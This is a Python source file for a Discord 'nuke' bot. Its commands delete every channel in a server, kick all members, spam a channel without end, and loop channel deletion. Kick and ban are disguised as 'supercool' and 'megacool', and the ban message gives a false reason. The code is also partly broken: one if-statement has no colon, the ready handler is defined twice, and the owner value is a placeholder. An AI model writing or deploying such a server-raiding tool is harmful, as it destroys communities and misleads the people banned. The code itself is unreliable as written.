import time
from re import S
import discord
from discord import client
from discord import reaction
from discord import member
from discord.embeds import Embed
from discord.ext import commands
import random
import asyncio
import datetime
import typing
from PIL import Image
from io import BytesIO
from discord.flags import Intents
import os
owner = (your discord id)
# prefix
bot = commands.Bot(command_prefix='!!')
#bot version
botversion = 1.0
#client control
client = discord.Client()
bot.remove_command('help')

@bot.event 
async def on_ready(ctx):
    print("Bot Online!")

@bot.event 
async def on_ready():
    await bot.change_presence(status=discord.Status.online, activity=discord.Game('Nuke simulator'))
    print('Bot Online')
    print('███╗░░██╗██╗░░░██╗██╗░░██╗███████╗')
    print('████╗░██║██║░░░██║██║░██╔╝██╔════╝')
    print('██╔██╗██║██║░░░██║█████═╝░█████╗░░')
    print('██║╚████║██║░░░██║██╔═██╗░██╔══╝░░')
    print('██║░╚███║╚██████╔╝██║░╚██╗███████╗')
    print('╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝')
    print('Developed By ShrimpFry')
    print(f'Bot version {botversion}')
    print('Use !!add to add roles (!!add <role> <user>), !!remove to remove roles (!!remove <role> <user>), !!nukechan (deletes all channels), !!create (!!create <channel_name>)')

@bot.command()
async def version(ctx):
    await ctx.message.delete()
    message1 = discord.Embed(color=discord.Colour.red(), timestamp=datetime.datetime.utcnow(), title=f"Current Version", description=f"The current bot version is {botversion} YEEHAW!")
    await ctx.channel.send(embed=message1)



@bot.command()
async def nukechan(ctx):
  await ctx.message.delete()

  if ctx.author.id == owner or ctx.author.id == 554785423948251166:

    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass

    await ctx.guild.create_text_channel('NUKED')
    channel = discord.utils.get(bot.get_all_channels(), guild=ctx.author.guild, name='NUKED')
    await channel.send("@everyone\nKABOOOM!!!\n")

  else:
    await ctx.send("You dont have access to this command!")

@bot.command()
async def nukekick(ctx):
  await ctx.message.delete()

  if ctx.author.id == owner


    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.kick()
                await ctx.send(f"Successfully kicked {member}")
        
        except Exception as e:
            await ctx.send(f"Unable to kick {member} {e}")
  else:
    await ctx.send("You dont have access to this command!")

@bot.command()
async def bombchan(ctx, channel: discord.TextChannel = None):
    if channel == None: 
        await ctx.send("You did not mention a channel!")
        return

    nuke_channel = discord.utils.get(ctx.guild.channels, name=channel.name)

    if nuke_channel is not None:
        new_channel = await nuke_channel.clone(reason="Has been Nuked!")
        await nuke_channel.delete()
        await new_channel.send("THIS CHANNEL HAS BEEN NUKED!")

    else:
        await ctx.send(f"No channel named {channel.name} was found!")

@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    while True:
        await ctx.send('This is spam')

@bot.command()
async def add(ctx, role: discord.Role, user: discord.Member):
    await ctx.message.delete()
    await user.add_roles(role)
    await ctx.author.send('added role!')

@bot.command() 
async def remove(ctx, role: discord.Role, user: discord.Member):
    await ctx.message.delete()
    await user.remove_roles(role)
    await ctx.author.send('removed role!')

@bot.command()
async def create(ctx, *, name=None):
  guild = ctx.message.guild
  if name == None:
    await ctx.message.delete()
    await ctx.author.send('Sorry, but you have to insert a name. Try again, but do it like this: `create [channel name]`')
  else:
    await ctx.message.delete()
    await guild.create_text_channel(name)
    await ctx.author.send(f"Created a channel named {name}")

@bot.command() 
async def delete(ctx):
    await ctx.message.delete()
    while True:
        await ctx.channel.delete()

@bot.command()
async def help(ctx):
    await ctx.message.delete()
    ms1 = discord.Embed(color=discord.Colour.purple(), timestamp=datetime.datetime.utcnow(), title=f"Commands (prefix = !!)", description=f"Use !!add to add roles (!!add <role> <user>), !!remove to remove roles (!!remove <role> <user>), !!nukechan (deletes all channels), !!create (!!create <channel_name>), !!supercool (!!supercool <user> 'this kicks a user'), !!megacool (!!megacool <user> 'this bans the user')")
    await ctx.message.author.send(embed=ms1)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('You dont have all the requirements!')
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Stupid")

@bot.command()
async def supercool(ctx, member : discord.Member, *, reason=None):
    await ctx.message.delete()
    await member.kick(reason=reason)

@bot.command()
async def megacool(ctx, member : discord.Member, *, reason=None):
    await ctx.message.delete()
    await member.ban(reason='Unknown Error Ocurred, this was likely due to an admin command that initiated a ban. If you believe this was a mistake, please contact the server owners.')

@bot.command()
async def credit(ctx):
    await ctx.send("Developer: shrimpfry#1234")







bot.run('yourtoken')
